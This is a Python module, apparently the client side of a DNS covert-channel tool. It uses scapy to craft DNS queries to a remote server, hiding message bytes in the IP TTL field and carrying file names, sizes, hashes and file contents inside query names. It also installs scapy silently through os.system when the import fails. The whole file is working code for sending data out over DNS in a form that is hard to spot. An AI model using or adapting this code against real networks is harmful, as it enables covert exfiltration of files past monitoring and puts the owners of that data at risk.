import os
import random
from IPGetandSet import getServerAddress

try: #auto install scapy
    from scapy.all import *
except ImportError:
    print("Trying to Install required module: scapy")
    os.system('pip3 install scapy')
    from scapy.all import *

#mode 0: send msg(ttl), mode 1: check shift, mode 2: request the server to receive the file, mode 3: send file data, mode 4: DNS covert channel feasibility test
#mode 5: send msg(DNS request), mode 6: send file end signal

#args[0] = message
#args[1] = mode
#args[2] = Ofilename
#args[3] = file_extension
#args[4] = flen
#args[5] = fhash
def craft(*args):
    global pkt
    global dest
    dest = getServerAddress()

    tid = random.randint(0, 65535)

    if args[1] == 0:
        hmsg = ord(args[0])

    if args[1] == 0:
        pkt = IP(ttl=hmsg, dst=dest)/UDP(dport=53)/DNS(id=tid, rd=1,qd=DNSQR(qname="www.mode0.com"))
        return pkt
    if args[1] == 1:
        pkt = IP(ttl=128, dst=dest)/UDP(dport=53)/DNS(id=tid, rd=1,qd=DNSQR(qname="www.mode1.com"))
        return pkt
    if args[1] == 2:
        pkt = IP(ttl=128, dst=dest)/UDP(dport=53)/DNS(id=tid, rd=1,qd=DNSQR(qname='###'+args[2]+args[3]+'?'+str(args[4])+'?'+args[5]))
        return pkt
    if args[1] == 3:
        pkt = IP(ttl=128, dst=dest)/UDP(dport=53)/DNS(id=tid, rd=1,qd=DNSQR(qname='@@@'+args[0]))
        return pkt
    if args[1] == 4:
        pkt = IP(ttl=128, dst=dest)/UDP(dport=53)/DNS(id=tid, rd=1,qd=DNSQR(qname="www.testtest.com"))
        return pkt
    if args[1] == 5:
        pkt = IP(ttl=128, dst=dest)/UDP(dport=53)/DNS(id=tid, rd=1,qd=DNSQR(qname="www.kk" + args[0] + ".com"))
        return pkt
    if args[1] == 6:
        pkt = IP(ttl=128, dst=dest)/UDP(dport=53)/DNS(id=tid, rd=1,qd=DNSQR(qname='$$$'))
        return pkt
    if args[1] == 7:
        pkt = IP(ttl=128, dst=dest)/UDP(dport=53)/DNS(id=tid, rd=1,qd=DNSQR(qname="www.ee" + args[0] + ".com"))
        return pkt
